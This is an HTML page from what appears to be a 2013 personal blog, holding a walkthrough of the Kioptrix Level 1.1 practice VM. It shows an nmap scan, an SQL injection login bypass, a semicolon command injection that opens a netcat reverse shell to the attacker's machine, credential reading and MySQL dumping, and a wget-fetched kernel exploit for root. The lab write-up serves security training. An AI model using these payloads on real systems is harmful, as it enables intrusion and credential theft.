@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Kioptrix Level 1.1 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2013-01-21">January 21, 2013</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/kioptrix">kioptrix</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Kioptrix Level 1.1</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>This is a walkthrough of how I completed Kioptrix Level 1.2.  The goal of the challenge is to obtain the flag.</p>
+
+<h2 id="nmap:9a8c984df175a5e455bd837f325e544a">Nmap</h2>
+
+<pre><code class="language-text">root@kali:~/kioptrix/2# nmap -n -sV -A -p- 192.168.1.121
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+|_sshv1: Server supports SSHv1
+80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+111/tcp  open  rpcbind  2 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1            822/udp  status
+|_  100024  1            825/tcp  status
+443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2009-10-07T23:10:47+00:00
+|_Not valid after:  2010-10-07T23:10:47+00:00
+|_ssl-date: 2014-04-24T00:38:09+00:00; +3h59m58s from local time.
+| sslv2:
+|   SSLv2 supported
+|   ciphers:
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_CBC_128_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC2_CBC_128_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+631/tcp  open  ipp      CUPS 1.1
+| http-methods: Potentially risky methods: PUT
+|_See http://nmap.org/nsedoc/scripts/http-methods.html
+|_http-title: 403 Forbidden
+825/tcp  open  status   1 (RPC #100024)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1            822/udp  status
+|_  100024  1            825/tcp  status
+3306/tcp open  mysql    MySQL (unauthorized)
+</code></pre>
+
+<h2 id="sql-injection-login-bypass:9a8c984df175a5e455bd837f325e544a">SQL Injection Login Bypass</h2>
+
+<p>I went and had a look at the Apache service running on port 80, and was greated with a login page.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/kioptrix-1-1/login.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>After a few attempts, I was able to bypass this login page by using SQL Injection.</p>
+
+<pre><code class="language-text">Username: admin
+Password: ' or '1'='1
+</code></pre>
+
+<p>This took me to another page, with a ping webapp.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/kioptrix-1-1/ping.jpg"  />
+    
+    
+</figure>
+</div>
+
+<h2 id="command-injection:9a8c984df175a5e455bd837f325e544a">Command Injection</h2>
+
+<p>Entering <code>127.0.0.1</code> in this box give me the expected output.</p>
+
+<pre><code class="language-text">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.064 ms
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.051 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.047 ms
+</code></pre>
+
+<p>By inserting a semi-colon <code>;</code> into the input window, I was able to insert additional commands.  I used this to check for <code>netcat</code>, then to obtain a remote shell.</p>
+
+<pre><code class="language-text">;/usr/local/bin/nc 192.168.1.120 4444 -e '/bin/bash'
+pwd
+/var/www/html
+ls -la
+total 24
+drwxr-xr-x  2 root root 4096 Oct  8  2009 .
+drwxr-xr-x  8 root root 4096 Oct  7  2009 ..
+-rwxr-Sr-t  1 root root 1733 Feb  9  2012 index.php
+-rwxr-Sr-t  1 root root  199 Oct  8  2009 pingit.php
+</code></pre>
+
+<h2 id="exploring-mysql:9a8c984df175a5e455bd837f325e544a">Exploring MySQL</h2>
+
+<p>I used the shell to read <code>index.php</code>, which was the original paged used to login, and obtain the username and password it uses to connect to the database.  I spent some time exploring the databases within.</p>
+
+<pre><code class="language-text">head index.php
+mysql_connect(&quot;localhost&quot;, &quot;john&quot;, &quot;hiroshima&quot;) or die(mysql_error());
+</code></pre>
+
+<pre><code class="language-text">mysql --user=john --password=hiroshima -e &quot;show databases;&quot;
+mysql --user=john --password=hiroshima -e &quot;use mysql; show tables;&quot;
+mysql --user=john --password=hiroshima -e &quot;use mysql; select * from user;&quot;
+mysql --user=john --password=hiroshima -e &quot;use mysql; select user, password from user;&quot;
+mysql --user=john --password=hiroshima -e &quot;use webapp; show tables;&quot;
+mysql --user=john --password=hiroshima -e &quot;use webapp; select * from users;&quot;
+</code></pre>
+
+<h2 id="privilege-escalation:9a8c984df175a5e455bd837f325e544a">Privilege Escalation</h2>
+
+<p>In the end, I found a local kernel exploit that worked nicely in elevating my shell to root.  I transfered the exploit by hosting it on my own apache server and using <code>wget</code>.  It was then compiled with <code>gcc</code> and run.</p>
+
+<pre><code class="language-text">wget http://192.168.1.120/x.c -O x.c
+gcc x.c -o x
+./x
+sh-3.00# id
+uid=0(root) gid=0(root) groups=48(apache)
+sh-3.00# cat /root/.mysql_history
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2013  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
